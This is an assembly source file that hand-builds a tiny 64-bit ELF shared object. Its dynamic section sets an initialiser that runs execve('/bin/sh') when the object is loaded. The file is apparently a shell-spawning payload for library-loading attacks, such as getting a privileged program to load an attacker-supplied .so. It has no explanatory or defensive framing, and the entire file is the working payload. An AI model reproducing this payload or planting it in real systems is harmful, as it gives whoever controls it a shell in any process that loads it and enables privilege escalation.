use64
org 0x0
 
ehdr:                          ; Elf64_Ehdr
  db  0x7f, "ELF", 2, 1, 1, 0  ; e_ident
      times 8 db      0
  dw  3                        ; e_type
  dw  0x3e                     ; e_machine
  dd  1                        ; e_version
  dq  _start                   ; e_entry
  dq  phdr - $$                ; e_phoff
  dq  0                        ; e_shoff
  dd  0                        ; e_flags
  dw  ehdrsize                 ; e_ehsize
  dw  phdrsize                 ; e_phentsize
  dw  2                        ; e_phnum
  ;dw  64                      ; e_shentsize
  ;dw  4                       ; e_shnum
  ehdrsize  = $ - ehdr

phdr:                          ; Elf64_Phdr
    phdr_loadable:
        dd  1                  ; p_type
        dd  7                  ; p_flags
        dq  0                  ; p_offset
        dq  0                  ; p_vaddr
        dq  0                  ; p_paddr
        dq  filesize           ; p_filesz
        dq  filesize           ; p_memsz
        dq  0x1000             ; p_align
phdrsize  = $ - phdr
    phdr_dynamic:
        dd  2                  ; p_type
        dd  1                  ; p_flags
        ;dq  1                 ; p_offset
        ;dq  1                 ; p_vaddr
        ;dq  dynamic           ; p_paddr
        ;dq  dynamicsize       ; p_filesz
        ;dq  dynamicsize       ; p_memsz
        ;dq  8                 ; p_align


dynamic:
    dt_strtab:
        dq          5
        dq          dynamic
    dt_init:
        dq          12
        dq          main
    dt_symtab:
        dq          6
times 6 db          0

dynamicsize = $ - dynamic

main:
_start:

    xor eax,eax
    xor edx, edx

    mov rbx,'/bin/sh'
    push rbx
    push rsp
    pop rdi

    push rax
    push rdi 
    push rsp 
    pop rsi 
    
    mov al, 59
    syscall
    

; mainsize = $ - main


dynsym:
dynsymsize = $ - dynsym

filesize  = $ - $$